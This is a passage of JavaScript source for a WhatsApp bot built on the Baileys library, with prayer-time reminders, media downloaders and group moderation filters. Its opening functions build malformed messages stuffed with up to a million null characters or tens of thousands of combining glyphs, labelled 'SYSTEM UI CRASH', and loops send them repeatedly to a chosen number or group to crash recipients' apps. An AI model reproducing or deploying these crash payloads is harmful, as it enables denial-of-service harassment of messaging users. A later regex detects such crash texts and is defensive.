								'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
							},
							'footer': {
								'text': 'xp'
							},
							'nativeFlowMessage': {
								'buttons': [{
									'name': 'cta_url',
									'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
								}],
								'messageParamsJson': "\0".repeat(1000000)
							}
						}
					}
				}
			}), {
				'userJid': chat
			});
			await vreden.relayMessage(chat, msg.message, {
				'participant': {
					'jid': chat
				},
				'messageId': msg.key.id
			});
		}

		async function vredenbugloc(chat) {
			var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'liveLocationMessage': {
							'degreesLatitude': 'p',
							'degreesLongitude': 'p',
							"caption": `؂ن؃؄ٽ؂ن؃؄ٽ ✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp` + "ꦾ".repeat(60000),
							'sequenceNumber': '0',
							'jpegThumbnail': ''
						}
					}
				}
			}), {
				'userJid': chat
			});
			await vreden.relayMessage(chat, msg.message, {
				'participant': {
					'jid': chat
				},
				'messageId': msg.key.id
			});
		}

		async function vredenbugton(chat) {
			var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
				'listMessage': {
					'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(960000),
					'footerText': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
					'description': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
					'buttonText': null,
					'listType': 2,
					'productListInfo': {
						'productSections': [{
							'title': "anjay",
							'products': [{
								'productId': "4392524570816732"
							}]
						}],
						'productListHeaderImage': {
							'productId': "4392524570816732",
							'jpegThumbnail': null
						},
						'businessOwnerJid': "0@s.whatsapp.net"
					}
				},
				'footer': "puki",
				'contextInfo': {
					'expiration': 604800,
					'ephemeralSettingTimestamp': "1679959486",
					'entryPointConversionSource': "global_search_new_chat",
					'entryPointConversionApp': "whatsapp",
					'entryPointConversionDelaySeconds': 9,
					'disappearingMode': {
						'initiator': "INITIATED_BY_ME"
					}
				},
				'selectListType': 2,
				'product_header_info': {
					'product_header_info_id': 292928282928,
					'product_header_is_rejected': false
				}
			}), {
				'userJid': chat
			});
			await vreden.relayMessage(chat, msg.message, {
				'participant': {
					'jid': chat
				},
				'messageId': msg.key.id
			});
		}

		async function crashgc(chat) {
			let msg = generateWAMessageFromContent(chat, {
				viewOnceMessage: {
					message: {
						"messageContextInfo": {
							"deviceListMetadata": {},
							"deviceListMetadataVersion": 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.create({
							body: proto.Message.InteractiveMessage.Body.create({
								text: `Jawab Donggg`
							}),
							footer: proto.Message.InteractiveMessage.Footer.create({
								text: footxt
							}),
							header: proto.Message.InteractiveMessage.Header.create({
								title: "FIRG EMPIRE",
								subtitle: "Yahya Ali Almuthahar",
								hasMediaAttachment: false
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
								buttons: [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\n  currency: 'IDR',\n  payment_configuration: '',\n  payment_type: '',\n  transaction_id: '',\n  total_amount: { value: 3000000, offset: 100 },\n  reference_id: '4N88TZPXWUM',\n  type: 'physical-goods',\n  payment_method: '',\n  order: {\n    status: 'pending',\n    description: '',\n    subtotal: { value: 3500000, offset: 100 },\n    tax: { value: 500000, offset: 100 },\n    discount: { value: 1100000, offset: 100 },\n    shipping: { value: 100000, offset: 100 },\n    order_type: 'ORDER',\n    items: [\n  {\n    retailer_id: 'custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0',\n    name: 'SEGERA OUT❗❗',\n    amount: { value: 3000, offset: 100 },\n    quantity: ${totalFitur()}\n  }\n]\n  },\n  additional_note: ''\n}`
								}],
							})
						})
					}
				}
			}, {
				quoted: fchannel
			})

			await vreden.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			})
		}

		async function vredbug(nombor, jumlahnyo) {
			for (let i = 0; i < jumlahnyo; i++) {
				vredenbugone(nombor)
				vredenbugton(nombor)
				vredenbugloc(nombor)
				await delay(1000)
			}
		}

		async function gcbug(nombor, jumlahnyo) {
			for (let i = 0; i < jumlahnyo; i++) {
				crashgc(nombor)
				await delay(1000)
			}
		}

		//━━━━━━━━━━━━━━━[ AUTOBIO, AUTO SHOLAT ]━━━━━━━━━━━━━━━━━//
		if (setting.autobio) {
			if (setting.autobio === false) return
			let settingstatus = 0;
			if (new Date() * 1 - settingstatus > 1000) {
				await vreden.setStatus(`I'm ${vreden.user.name} 🤖 | ${runtime(os.uptime())} ⏰ | Status : ${vreden.mode ? "Public Mode" : "Self Mode"}`)
				settingstatus = new Date() * 1
			}
		}

		//JADWAL SHOLAT
		vreden.autosholat = vreden.autosholat ? vreden.autosholat : {}
		let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? vreden.user.jid : m.sender
		let id = m.chat
		if (!(id in vreden.autosholat)) {
			let jadwalSholat = {
				Fajr: "04:31",
				Dhuhr: "11:45",
				Asr: "15:06",
				Maghrib: "17:39",
				Isha: "19:09",
			}
			const date = new Date((new Date).toLocaleString("en-US", {
				timeZone: "Asia/Jakarta"
			}));
			const hours = date.getHours();
			const minutes = date.getMinutes();
			const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
			for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
				if (timeNow === waktu) {
					if (sholat === "Fajr") {
						thumbislam = "https://telegra.ph/file/b666be3c20c68d9bd0139.jpg"
					} else if (sholat === "Dhuhr") {
						thumbislam = "https://telegra.ph/file/5295095dad53783b9cd64.jpg"
					} else if (sholat === "Asr") {
						thumbislam = "https://telegra.ph/file/c0e1948ad75a2cba22845.jpg"
					} else if (sholat === "Maghrib") {
						thumbislam = "https://telegra.ph/file/0082ad9c0e924323e08a6.jpg"
					} else if (sholat === "Isha") {
						thumbislam = "https://telegra.ph/file/fd141833a983afa0a8412.jpg"
					} else {
						thumbislam = "https://telegra.ph/file/687fd664f674e90ae1079.jpg"
					}
					vreden.autosholat[id] = [
						vreden.sendMessage(m.chat, {
							audio: {
								url: "https://www.vreden.my.id/cdn/islamic/y2mate.com%20-%20Adzan%20Merdu%20Irama%20Jiharkah%20%20menyejukkan%20hati%20.mp3"
							},
							mimetype: 'audio/mpeg',
							contextInfo: {
								externalAdReply: {
									title: `Waktu ${sholat} telah tiba, ambilah air wudhu dan segeralah shalat🙂`,
									body: "untuk wilayah Semarang dan sekitarnya",
									mediaType: 1,
									previewType: 0,
									renderLargerThumbnail: true,
									thumbnailUrl: thumbislam,
									sourceUrl: "-"
								}
							}
						}, {
							quoted: m
						}),
						setTimeout(() => {
							delete vreden.autosholat[id]
						}, 57000)
					]
				}
			}
		}
		
		vreden.task = vreden.task ? vreden.task : false
		if (!vreden.task) {
		async function clearTmp() {
            try {
                let directoryPath = path.join('./')
				fs.readdir(directoryPath, async function(err, files) {
					if (err) {
						return console.log(err)
					}
					let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm"))
					if (filteredArray.length == 0) return console.log('Sampah Tidak Ditemukan')
					await filteredArray.forEach(function(file) {
						fs.unlinkSync(`./${file}`)
					});
				});
				let directoryPath2 = path.join('./sticker')
				fs.readdir(directoryPath2, async function(err, files) {
					if (err) {
						return console.log(err)
					}
					let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm"))
					if (filteredArray.length == 0) return console.log('Sampah2 Tidak Ditemukan')
					await filteredArray.forEach(function(file) {
						fs.unlinkSync(`./sticker/${file}`)
					});
				});
                } catch (error) {
                    console.error('Error clear cache:', error);
                }
            }

        if (setting.autobackup) {
        async function uploadData() {
            const FILE_PATH = './database/database.json';
            let botNumber = await vreden.decodeJid(vreden.user.id)
            const fileName = `${botNumber.split('@')[0]}.json`;
            try {
                let data = await uploadFileToGitHub(FILE_PATH, fileName);
                console.log("database backup!");
                } catch (error) {
                    console.error('Error uploading file database:', error);
                }
            }
            setInterval(uploadData, 28800000);
        }
		setInterval(clearTmp, 21600000)
		_sewa.expiredCheck(vreden)
		_prem.expiredCheck(vreden)
		_mingguan.expiredMingguanCheck(vreden)
		_bulanan.expiredBulananCheck(vreden)
		vreden.task = true
		}
		
		//━━━━━━━━━━━━━━━[ AKSES DATABASE ]━━━━━━━━━━━━━━━━━//
		var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
		for (let stik of setiker) {
			if (!textmessage && budy === stik) {
				result = fs.readFileSync(`./database/${stik}.webp`)
				await vreden.imgToSticker(m.chat, result, m, {
					packname: `Sticker Maker\nNomor Bot :`,
					author: `${botName}\n${ownnomor}`
				})
			}
		}
		for (let audio of audionye) {
			if (!textmessage && budy === audio) {
				result = fs.readFileSync(`./database/${audio}.mp3`)
				vreden.sendAudio(m.chat, result, m, true)
			}
		}
		for (let img of imagenye) {
			if (!textmessage && budy === img) {
				result = fs.readFileSync(`./database/${img}.jpg`)
				vreden.sendImage(m.chat, result, '', m)
			}
		}
		for (let video of videonye) {
			if (!textmessage && budy === video) {
				result = fs.readFileSync(`./database/${video}.mp4`)
				vreden.sendVideo(m.chat, result, false, "", m)
			}
		}
		async function addCountCmdUser(nama, sender, u) {
			var posi = null
			var pos = null
			Object.keys(u).forEach((i) => {
				if (u[i].jid === sender) {
					posi = i
				}
			})
			if (posi === null) {
				u.push({
					jid: m.sender,
					db: [{
						nama: nama,
						count: 0
					}]
				})
				fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
				Object.keys(u).forEach((i) => {
					if (u[i].jid === m.sender) {
						posi = i
					}
				})
			}
			if (posi !== null) {
				Object.keys(u[posi].db).forEach((i) => {
					if (u[posi].db[i].nama === nama) {
						pos = i
					}
				})
				if (pos === null) {
					u[posi].db.push({
						nama: nama,
						count: 1
					})
					fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
				} else {
					u[posi].db[pos].count += 1
					fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
				}
			}
		}

		async function getPosiCmdUser(sender, _db) {
			var posi = null
			Object.keys(_db).forEach((i) => {
				if (_db[i].jid === sender) {
					posi = i
				}
			})
			return posi
		}

		async function addCountCmd(nama, sender, _db) {
			addCountCmdUser(nama, m.sender, _cmdUser)
			var posi = null
			Object.keys(_db).forEach((i) => {
				if (_db[i].nama === nama) {
					posi = i
				}
			})
			if (posi === null) {
				_db.push({
					nama: nama,
					count: 1
				})
				fs.writeFileSync('./database/command.json', JSON.stringify(_db, null, 2));
			} else {
				_db[posi].count += 1
				fs.writeFileSync('./database/command.json', JSON.stringify(_db, null, 2));
			}
		}


		//━━━━━━━━━━━━━━━[ STORE ]━━━━━━━━━━━━━━━━━//
		if (m.isGroup && chatsdb[m.chat].liststore[body]) {
			let teks = chatsdb[m.chat].liststore[body].response
			if (chatsdb[m.chat].liststore[body].img) {
				vreden.sendMessage(m.chat, {
					image: {
						url: chatsdb[m.chat].liststore[body].img
					},
					caption: teks
				}, {
					quoted: m
				})
			} else if (chatsdb[m.chat].liststore[body].video) {
				vreden.sendMessage(m.chat, {
					video: {
						url: chatsdb[m.chat].liststore[body].video
					},
					caption: teks
				}, {
					quoted: m
				})
			} else {
				const contentText = {
					text: teks,
					contextInfo: {
						mentionedJid: ments(teks),
						forwardingScore: 9999999,
						isForwarded: true,
						externalAdReply: {
							showAdAttribution: true,
							containsAutoReply: true,
							title: `Store List 🛍️`,
							body: footxt,
							previewType: "PHOTO",
							thumbnailUrl: `https://pomf2.lain.la/f/sdzl7dc2.jpg`,
							sourceUrl: tiktok
						}
					}
				};
				vreden.sendMessage(m.chat, contentText, {
					quoted: m,
				});
			}
		}

		const sendFileFromUrl = async (from, url, caption, mek, men) => {
			let mime = '';
			let res = await axios.head(url)
			mime = res.headers['content-type']
			if (mime.split("/")[1] === "gif") {
				return vreden.sendMessage(m.chat, {
					video: await getBuffer(url),
					caption: caption,
					gifPlayback: true,
					mentions: men ? men : [],
					mimetype: 'video/mp4'
				}, {
					quoted: m
				})
			}
			let type = mime.split("/")[0] + "Message"
			if (mime === "application/pdf") {
				return vreden.sendMessage(m.chat, {
					document: await getBuffer(url),
					mimetype: 'application/pdf',
					caption: caption,
					mentions: men ? men : []
				}, {
					quoted: m
				})
			}
			if (mime.split("/")[0] === "image") {
				return vreden.sendMessage(m.chat, {
					image: await getBuffer(url),
					caption: caption,
					mentions: men ? men : []
				}, {
					quoted: m
				})
			}
			if (mime.split("/")[0] === "video") {
				return vreden.sendMessage(m.chat, {
					video: await getBuffer(url),
					caption: caption,
					mentions: men ? men : [],
					mimetype: 'video/mp4'
				}, {
					quoted: m
				})
			}
			if (mime.split("/")[0] === "audio") {
				return vreden.sendMessage(m.chat, {
					audio: await getBuffer(url),
					caption: caption,
					mentions: men ? men : [],
					mimetype: 'audio/mpeg'
				}, {
					quoted: m
				})
			}
		}

		//━━━━━━━━━━━━━━━[ AUTOREAD AND ONLINE ]━━━━━━━━━━━━━━━━━//
		if (!m.key.fromMe && setting.autoread) {
			const readkey = {
				remoteJid: m.chat,
				id: m.key.id,
				participant: m.isGroup ? m.key.participant : undefined
			}
			await vreden.readMessages([readkey]);
		}

		vreden.sendPresenceUpdate('available', m.chat)

		//━━━━━━━━━━━━━━━[ YT DOWNLOAD ]━━━━━━━━━━━━━━━━━//
		const downloadMp3 = async (Link, Quality = 128) => {
			try {
				const availableQuality = ["64", "128", "192", "256", "320"];
				let quality = availableQuality.includes(Quality) ? Quality : "128";
				let yutub = await ytmp3(Link, quality)
				await vreden.sendMessage(m.chat, {
					audio: {
						url: yutub.url
					},
					mimetype: 'audio/mpeg',
					contextInfo: {
						forwardingScore: 9999999,
						isForwarded: true,
						externalAdReply: {
							title: `乂 YTMP3 - ${quality}kbps`,
							body: yutub.title,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							thumbnailUrl: yutub.thumbnail,
							sourceUrl: Link
						}
					}
				}, {
					quoted: m
				})
			} catch (error) {
				await m.errorReport(util.format(error), command)
			}
		}
		const downloadDoc = async (Link, Quality = 128) => {
			try {
				const availableQuality = ["64", "128", "192", "256", "320"];
				let quality = availableQuality.includes(Quality) ? Quality : "128";
				let yutub = await ytmp3(Link, quality)
				const Cap = `*${yutub.title}*\n\n\n*⌬ Ext* : Download\n*⌬ ID* : ${yutub.vid}\n*⌬ Quality* : ${quality}kbps\n\n\n_*Nihh Omm...*_`;
				vreden.sendMessage(m.chat, {
					document: {
						url: yutub.url
					},
					mimetype: 'audio/mpeg',
					fileName: `${yutub.title}.mp3`,
					caption: Cap,
					contextInfo: {
						mentionedJid: [m.sender],
						externalAdReply: {
							title: `YouTube ${quality}kbps 🍟`,
							previewType: "PHOTO",
							thumbnailUrl: `https://pomf2.lain.la/f/43rm3qxa.png`,
							sourceUrl: Link
						}
					}
				}, {
					quoted: m
				})
			} catch (error) {
				await m.errorReport(util.format(error), command)
			}
		}
		const downloadMp4 = async (Link, Quality = "360p") => {
			try {
				const availableQuality = ["144p", "240p", "360p", "480p", "720p"];
				let quality = availableQuality.includes(Quality) ? Quality : "360p";
				let data = await ytmp4(Link);
				if (!isPremium && data.video[quality].size > 30000) {
					return m.warning(`*⚠️ File Terlalu Besar*\n\nFile Kamu *(${data.video[quality].sizeH})*\nMaximal Downloader\nUser Free Adalah *30MB*\nDan Untuk User Premium\nMaximal Download *90MB*`);
				}
				if (data.video[quality].size > 90000) {
					return m.warning(`*⚠️ File Terlalu Besar*\n\nFile Kamu *(${data.video[quality].sizeH})*\nMaximal Downloader\nDiWhatsApp Adalah *90MB*`);
				}
				let url;
				do {
					url = await data.video[quality].url();
				} while (url.result === "Converting");
				const Cap = `*${data.title}*\n\n\n*⌬ Ext* : Download\n*⌬ ID* : ${data.vid}\n*⌬ Quality* : ${quality}\n\n\n_*Nihh Omm...*_`;
				await vreden.sendMessage(m.chat, {
					video: {
						url: url.result
					},
					caption: Cap,
					gifPlayback: false
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command)
			}
		}
		const ytdlMp3 = async (Link) => {
			try {
				const data = await ytdl.ytmp3(Link)
				await vreden.sendMessage(m.chat, {
					audio: {
						url: data.download.url
					},
					mimetype: 'audio/mpeg',
					contextInfo: {
						forwardingScore: 9999999,
						isForwarded: true,
						externalAdReply: {
							title: `乂 YOUTUBE MUSIC`,
							body: data.metadata.title,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							thumbnailUrl: data.metadata.thumbnail,
							sourceUrl: Link
						}
					}
				}, {
					quoted: m
				})
			} catch (error) {
				await m.errorReport(util.format(error), command)
			}
		}
		const ytdlMp4 = async (Link) => {
			try {
				const data = await ytdl.ytmp4(Link)
				const Cap = `*${data.metadata.title}*

*⌬ Ext* : Download
*⌬ ID* : ${data.metadata.videoId}
*⌬ Durasi* : ${data.metadata.timestamp}
*⌬ Upload* : ${data.metadata.ago}
*⌬ Views* : ${data.metadata.views}
*⌬ Channel* : ${data.metadata.author.name}

_*Nihh Omm...*_`;
				await vreden.sendMessage(m.chat, {
					video: {
						url: data.download.url
					},
					caption: Cap,
					gifPlayback: false
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command)
			}
		}

		//━━━━━━━━━━━━━━━[ ANTI MEDIA ]━━━━━━━━━━━━━━━━━//

		if (chatsdb[m.chat].antidocument) {
			if (m.mtype === "documentWithCaptionMessage" || m.mtype === "documentMessage") {
				if (!(mek.key.fromMe || isAdmins || isCreator || isBotAdmins)) {
					await vreden.sendMessage(m.chat, {
						delete: m.key
					});
				}
			}
		}

		if (chatsdb[m.chat].antiaudio) {
			if (m.mtype === "audioMessage") {
				if (!(mek.key.fromMe || isAdmins || isCreator || !isBotAdmins)) {
					let buffer = await quoted.download();
					await vreden.sendMessage(m.chat, {
						audio: buffer,
						mimetype: 'audio/mpeg',
						ptt: true,
						viewOnce: true
					}, {
						quoted: m
					});
					await vreden.sendMessage(m.chat, {
						delete: m.key
					});
				}
			}
		}

		if (chatsdb[m.chat].antiimage) {
			if (m.mtype === "imageMessage") {
				if (!(mek.key.fromMe || isAdmins || isCreator || !isBotAdmins)) {
					let buffer = await quoted.download();
					await vreden.sendMessage(m.chat, {
						image: buffer,
						caption: `*「 ANTI CHAT IMAGE 」*\n\n*Caption:*\n${body}`,
						viewOnce: true
					}, {
						quoted: m
					});
					await vreden.sendMessage(m.chat, {
						delete: m.key
					});
				}
			}
		}

		if (chatsdb[m.chat].antisticker) {
			if (m.mtype === "stickerMessage") {
				if (!(mek.key.fromMe || isAdmins || isCreator || !isBotAdmins)) {
					await vreden.sendMessage(m.chat, {
						delete: m.key
					});
				}
			}
		}

		if (chatsdb[m.chat].antivideo) {
			if (m.mtype === "videoMessage") {
				if (!(mek.key.fromMe || isAdmins || isCreator || isBotAdmins)) {
					let buffer = await quoted.download();
					await vreden.sendMessage(m.chat, {
						video: buffer,
						caption: `*「 ANTI CHAT VIDEO 」*\n\n*Caption:*\n${body}`,
						viewOnce: true
					}, {
						quoted: m
					});
					await vreden.sendMessage(m.chat, {
						delete: m.key
					});
				}
			}
		}

		if (chatsdb[m.chat].antipolling) {
			if (m.mtype === "pollCreationMessageV3") {
				if (!(mek.key.fromMe || isAdmins || isCreator || !isBotAdmins)) {
					m.danger(`*「 POLLING DETECTOR 」*\n\nDilarang Kirim Polling\n\n`)
					await vreden.sendMessage(m.chat, {
						delete: m.key
					});
				}
			}
		}

		//━━━━━━━━━━━━━━━[ ANTIPROMOSI ]━━━━━━━━━━━━━━━━━//
		const pattern = /(?:OPEN\s+MURID\s+SEKS|PROMO|DISKON|SALE|KEUNTUNGAN|SEKS|LISENSI|LEGAL|PREMIUM|PASS|TRX|REFF|RUGIMU|GSH\s+BCT|MISKIN\s+DIEM|list\s+harga|harga|vps|note|panel|nokos|bot|sewa|murnokos|murubug|murunbanned|jasa|fix\s+fitur|rec|add\s+fitur|rename|recode|panel\s+private|adp|permanen|server|pembuat\s+SC|ready\s+nokos|work|free\s+fix|fitur\s+jamin|stok\s+\d+\s+biji|minat\s+pm)\b.*?(\d{1,3}[.,]?\d{0,3}[Kk]?|⚡[\w\s]+⚡|\d+[-\d]+\s?[^\d\s]+|(?<=\b(?:minat|chat|wa\.me|PM)\b.*?\d+))/i;

		function isPromosi(text) {
			return pattern.test(text);
		}
		if (chatsdb[m.chat].antipromosi) {
			if (isPromosi(body)) {
				if (!(mek.key.fromMe || isAdmins || isCreator || !isBotAdmins)) {
					m.danger(`*「 ANTI PROMOSI 」*\n\n*Dilarang Promosi!*\n\n> beta version`)
					await vreden.sendMessage(m.chat, {
						delete: m.key
					})
				}
			}
		}

		//━━━━━━━━━━━━━━━[ ANTIBOT ]━━━━━━━━━━━━━━━━━//
		if (chatsdb[m.chat].antibot) {
			const id = mek.key.id;
			const idLength = id.length;

			if (m.isBaileys) {

				if (mek.key.fromMe || isAdmins || isCreator || !isBotAdmins || isWhitelist) return;

				m.danger(`*「 ANTIBOT DETECTOR 」*\n\n*Message Info:*\n- Type: ${m.mtype}\n- isBaileys: ${m.isBaileys}\n- BaileysDetection: ${idLength}\n- Jenis: ${m.typeBaileys}\n\n#${id}`);
				await vreden.sendMessage(m.chat, {
					delete: m.key
				});
				await sleep(1000);
				vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
			}
		}

		//━━━━━━━━━━━━━━━[ ANTIBOT V2 ]━━━━━━━━━━━━━━━━━//
		if (chatsdb[m.chat].antibot2) {
			if (m.isBaileys) {
				if (mek.key.fromMe || isAdmins || isCreator || !isBotAdmins || isWhitelist) return;

				await vreden.sendMessage(m.chat, {
					delete: m.key
				});
				await sleep(1000);
				await vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
			}
		}

		if (m.isBaileys) return;

		//━━━━━━━━━━━━━━━[ ANTIVIRTEX ]━━━━━━━━━━━━━━━━━//
		const regVirtex = /ﱣﱣﱣﱣﱣﱣﱣ|؀؁؀؁|᥋᥋᥋᥋᥋᥋᥋᥋᥋|[🎩]-𝑬𝒙𝒑𝒍𝒐𝒔𝒊𝒐𝒏-💥|ผิด| ⃢|𒅒ܷܷܷܷܷ֭֭֭֭֭֭֭֭֭ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊ࠝࠝࠝࠝࠝࠝࠝ𒅒ܷܷܷܷܷۣۣۣۣۣۣۣۣۣۣۣۣۣۣٚٚٚٚٚٚٚٚٚٚٚٚٚٚٚٚ̂̂̂̂̂̂̂̂̂̂̂̂̂̂̂ۜۜۜۜۜۜ˳֗֗֗֗֗ࠧࠧࠧࠧࠬࠬࠬࠬࠬࠬࠬͦͦͦͦͦͦͦͦࠝࠝࠝࠝ𒅒ۣۣۣۣۣۣۣۣۣ֗֗̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊̊ 𑂺𑂺𑂺𑂺𑂺ۣۣۣۣۣۣۣۣۣۣۣۣۣۜۜۜۜۜۜۜۜۜۜۜ̂̂̂̂̂̂̂̂̂̂̂ࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧࠧ֯֯֯֯֯˳ْْْْْ֛֛֛ۨۨۨۨۨۨۨۨۨۨۨ |؛*.*ࣨࣨ|৭৭৭|๒๒๒|؋.ᄻ.ྜྷ.ᇸ.ྙ|๖ۣۜy๖ۣۜF๖ۣۜr๖|๑๑๑|৭৭৭৭৭৭৭৭|๑๑๑๑๑๑๑๑|ผิดุท้่เึางืผิดุท้่เึางื|๒๒๒๒๒๒๒๒|ผิดุท้่เึางืผิดุท้่เึางื|PLHIPS|๒|๑|ৡ|⃟|Đ.Δ.Μ|ท้่เึางื|𖣘𝓜꙰⃢⃠⃠⃠⃠⃠/i // tambahin sendiri
		let isVirtexOn = regVirtex.exec(m.text)
		if (chatsdb[m.chat].antivirtex && isVirtexOn) {
			if (budy.length > 4000) {
				m.danger(`*「 VIRTEX DETECTOR 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
				if (!isBotAdmins) return bales(`Anjir lupa gw bukan admin`)
				if (isAdmins) return bales(`Gajadi, Kamu admin`)
				if (isCreator) return bales(`Gajadi, Kamu ownerku`)
				await vreden.sendMessage(m.chat, {
					delete: m.key
				})
				vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			}
		}

		//━━━━━━━━━━━━━━━[ AUTO DOWNLOADER ]━━━━━━━━━━━━━━━━━//
		if (chatsdb[m.chat].autodl && !isCmd) {
			const igPattern = /(https?:\/\/(?:www\.)?instagram\.[a-z\.]{2,6}\/[\w\-\.]+(\/[^\s]*)?)/g;
			const tikPattern = /(http(?:s)?:\/\/)?(?:www\.)?(?:tiktok\.com\/@[^\/]+\/video\/(\d+))|(http(?:s)?:\/\/)?vm\.tiktok\.com\/([^\s&]+)|(http(?:s)?:\/\/)?vt\.tiktok\.com\/([^\s&]+)/g;
			const ytPattern = /(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/;

			const igLinks = (m.text.trim()).match(igPattern);
			const tikLinks = (m.text.trim()).match(tikPattern);
			const ytLinks = (m.text.trim()).match(ytPattern);

			if (ytLinks) {
				m.reply(`*「 YT LINK DETECTED 」*\n\n_Tunggu Sebentar, File Anda Sedang Didownload Secara Otomatis_`);
				try {
					downloadMp3(ytLinks[0]);
				} catch (error) {
					m.reply(`*URL invalid*`);
				}
			}

			if (tikLinks && !chatsdb[m.chat].antilinktt) {
				m.reply(`*「 TT LINK DETECTED 」*\n\n_Tunggu Sebentar, File Anda Sedang Didownload Secara Otomatis_`);
				try {
					let data = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${tikLinks[0]}`);
					let counter = 0;
					for (let item of data.result.data) {
						if (item.type === "nowatermark") {
							vreden.sendMessage(m.chat, {
								video: {
									url: item.url
								},
								caption: `*Video Info* :
- Region : ${data.result.region}
- Duration : ${data.result.duration}
- Taken : ${data.result.taken_at}

*Statistik Info* :
- Views : ${data.result.stats.views}
- Likes : ${data.result.stats.likes}
- Comment : ${data.result.stats.comment}
- Share : ${data.result.stats.share}
- Download : ${data.result.stats.download}

*Author Info* :
- Fullname : ${data.result.author.fullname}
- Nickname : ${data.result.author.nickname}

*Music Info* :
- Title : ${data.result.music_info.title}
- Author : ${data.result.music_info.author}
